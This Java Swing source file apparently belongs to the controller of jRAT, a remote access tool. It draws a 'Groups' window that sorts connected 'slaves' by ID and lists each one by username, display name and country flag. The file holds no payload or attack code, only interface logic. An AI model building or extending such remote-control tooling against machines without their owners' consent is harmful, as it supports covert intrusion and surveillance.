package jrat.controller.ui.frames;

import jrat.controller.AbstractSlave;
import jrat.controller.Main;
import jrat.controller.ui.renderers.GroupTreeRenderer;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.HashMap;
import java.util.List;


@SuppressWarnings("serial")
public class FrameGroups extends BaseFrame {

    private DefaultMutableTreeNode root;
	private JTree tree;

	public FrameGroups() {
		setTitle("Groups");
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameGroups.class.getResource("/group.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
        JPanel contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {				
				FrameGroups group = new FrameGroups();
				group.setVisible(true);
				setVisible(false);
				dispose();
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 421, GroupLayout.PREFERRED_SIZE).addComponent(btnReload)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 221, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 8, Short.MAX_VALUE).addComponent(btnReload)));

		tree = new JTree();
		tree.setCellRenderer(new GroupTreeRenderer());
		tree.setShowsRootHandles(true);
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("root") {
			{
				root = this;
			}
		}));
		scrollPane.setViewportView(tree);
		contentPane.setLayout(gl_contentPane);

		load();
	}

	public void load() {
		DefaultTreeModel model = (DefaultTreeModel) tree.getModel();

		GroupTreeRenderer renderer = (GroupTreeRenderer) tree.getCellRenderer();

		HashMap<String, DefaultMutableTreeNode> nodes = new HashMap<>();

		List<AbstractSlave> list = Main.connections;

		renderer.getIconMap().clear();

		for (int i = 0; i < list.size(); i++) {
			AbstractSlave slave = list.get(i);
			String val = slave.getUsername() + "@" + slave.getDisplayName();
			renderer.getIconMap().put(val.toLowerCase(), slave.getFlag());

			if (nodes.containsKey(slave.getID())) {
				model.insertNodeInto(new DefaultMutableTreeNode(val), nodes.get(slave.getID()), nodes.get(slave.getID()).getChildCount());
			} else {
				DefaultMutableTreeNode r = new DefaultMutableTreeNode(slave.getID());
				nodes.put(slave.getID(), r);
				model.insertNodeInto(nodes.get(slave.getID()), root, root.getChildCount());
				model.insertNodeInto(new DefaultMutableTreeNode(val), nodes.get(slave.getID()), nodes.get(slave.getID()).getChildCount());
			}
		}

		expandAll();
	}

	public void expandAll() {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.expandRow(i);
		}
	}

	public void collapseAll() {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.collapseRow(i);
		}
	}
}
